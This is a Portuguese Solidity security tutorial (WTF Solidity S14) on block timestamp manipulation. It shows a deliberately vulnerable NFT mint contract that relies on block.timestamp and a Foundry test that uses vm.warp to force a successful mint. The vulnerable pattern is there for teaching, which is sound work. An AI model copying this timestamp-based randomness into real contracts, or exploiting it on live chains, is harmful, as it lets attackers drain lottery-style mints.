---
title: S14. Manipulação do Tempo de Bloco
tags:
- solidity
- segurança
- timestamp
---

# WTF Solidity Contratos Seguros: S14. Manipulação do Tempo de Bloco

Recentemente, tenho estudado solidity novamente para revisar os detalhes e escrever um "Guia WTF de Introdução ao Solidity" para iniciantes (programadores experientes podem procurar outros tutoriais). Serão lançadas de 1 a 3 lições por semana.

Twitter: [@0xAA_Science](https://twitter.com/0xAA_Science)｜[@WTFAcademy_](https://twitter.com/WTFAcademy_)

Comunidade: [Discord](https://discord.gg/5akcruXrsk)｜[Grupo do WeChat](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[Site oficial wtf.academy](https://wtf.academy)

Todo o código e tutoriais estão disponíveis no GitHub: [github.com/AmazingAng/WTFSolidity](https://github.com/AmazingAng/WTFSolidity)

-----

Nesta lição, vamos falar sobre o ataque de manipulação do tempo de bloco em contratos inteligentes e reproduzi-lo usando o Foundry. Antes do Merge, os mineradores de Ethereum podiam manipular o tempo de bloco, o que poderia ser explorado se um contrato de loteria dependesse do timestamp do bloco.

## Tempo de Bloco

O tempo de bloco (block timestamp) é um valor `uint64` incluído no cabeçalho de um bloco Ethereum, representando o timestamp UTC (em segundos) em que o bloco foi criado. Antes do Merge, o Ethereum ajustava a dificuldade dos blocos com base no poder de processamento, o que resultava em tempos de bloco variáveis, com uma média de 14,5 segundos por bloco. Os mineradores podiam manipular o tempo de bloco. Após o Merge, o tempo de bloco foi fixado em 12 segundos e os nós de validação não podem mais manipular o tempo de bloco.

Em Solidity, os desenvolvedores podem obter o timestamp do bloco atual usando a variável global `block.timestamp`, que é do tipo `uint256`.

## Exemplo de Vulnerabilidade

Este exemplo é uma modificação do contrato apresentado em [WTF Solidity Contratos Seguros: S07. Números Aleatórios Ruins](./32_Faucet). Alteramos a condição da função de criação `mint()`: agora, a criação só é bem-sucedida se o timestamp do bloco for divisível por 170:

```solidity
contract TimeManipulation is ERC721 {
    uint256 totalSupply;

    // Construtor: inicializa o nome e o símbolo da coleção NFT
    constructor() ERC721("", ""){}

    // Função de criação: só é possível criar se o timestamp do bloco for divisível por 170
    function luckyMint() external returns(bool success){
        if(block.timestamp % 170 == 0){
            _mint(msg.sender, totalSupply); // criação
            totalSupply++;
            success = true;
        }else{
            success = false;
        }
    }
}
```

## Reproduzindo o Ataque com o Foundry

Para reproduzir o ataque, o atacante só precisa manipular o tempo de bloco para um número divisível por 170. Vamos usar o Foundry para isso, pois ele fornece códigos de trapaça para modificar o tempo de bloco. Se você não está familiarizado com o Foundry/códigos de trapaça, pode ler o [tutorial do Foundry](../Topics/Tools/TOOL07_Foundry/readme.md) e o [Foundry Book](https://book.getfoundry.sh/forge/cheatcodes).

Lógica do código:

1. Criar uma variável de contrato `nft` do tipo `TimeManipulation`.
2. Criar um endereço de carteira `alice`.
3. Usar o código de trapaça `vm.warp()` para definir o tempo de bloco como 169, o que não é divisível por 170 e resultará em falha na criação.
4. Usar o código de trapaça `vm.warp()` para definir o tempo de bloco como 17000, o que é divisível por 170 e resultará em sucesso na criação.

Código:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/TimeManipulation.sol";

contract TimeManipulationTest is Test {
    TimeManipulation public nft;

    // Calcula o endereço para uma chave privada fornecida
    address alice = vm.addr(1);

    function setUp() public {
        nft = new TimeManipulation();
    }

    // forge test -vv --match-test  testMint
    function testMint() public {
        console.log("Condição 1: block.timestamp % 170 != 0");
        // Define block.timestamp como 169
        vm.warp(169);
        console.log("block.timestamp: %s", block.timestamp);
        // Define o endereço do chamador das chamadas subsequentes como o endereço fornecido
        // até que `stopPrank` seja chamado
        vm.startPrank(alice);
        console.log("Saldo de alice antes da criação: %s", nft.balanceOf(alice));
        nft.luckyMint();
        console.log("Saldo de alice após a criação: %s", nft.balanceOf(alice));

        // Define block.timestamp como 17000
        console.log("Condição 2: block.timestamp % 170 == 0");
        vm.warp(17000);
        console.log("block.timestamp: %s", block.timestamp);
        console.log("Saldo de alice antes da criação: %s", nft.balanceOf(alice));
        nft.luckyMint();
        console.log("Saldo de alice após a criação: %s", nft.balanceOf(alice));
        vm.stopPrank();
    }
}

```

Após instalar o Foundry, execute o seguinte comando no terminal para iniciar um novo projeto e instalar a biblioteca OpenZeppelin:

```shell
forge init TimeManipulation
cd TimeManipulation
forge install Openzeppelin/openzeppelin-contracts
```

Copie o código desta lição para as pastas `src` e `test`, respectivamente. Em seguida, execute o seguinte comando para iniciar os testes:

```shell
forge test -vv --match-test testMint
```

A saída será a seguinte:

```shell
Running 1 test for test/TimeManipulation.t.sol:TimeManipulationTest
[PASS] testMint() (gas: 94666)
Logs:
  Condição 1: block.timestamp % 170 != 0
  block.timestamp: 169
  Saldo de alice antes da criação: 0
  Saldo de alice após a criação: 0
  Condição 2: block.timestamp % 170 == 0
  block.timestamp: 17000
  Saldo de alice antes da criação: 0
  Saldo de alice após a criação: 1

Test result: ok. 1 passed; 0 failed; finished in 7.64ms
```

Podemos ver que a criação é bem-sucedida quando o `block.timestamp` é alterado para 17000.

## Conclusão

Nesta lição, discutimos o ataque de manipulação do tempo de bloco em contratos inteligentes e o reproduzimos usando o Foundry. Antes do Merge, os mineradores de Ethereum podiam manipular o tempo de bloco, o que poderia ser explorado se um contrato de loteria dependesse do timestamp do bloco. Após o Merge, o Ethereum fixou o tempo de bloco em 12 segundos e os nós de validação não podem mais manipular o tempo de bloco. Portanto, esse tipo de ataque não ocorrerá no Ethereum, mas ainda pode ser encontrado em outras blockchains.

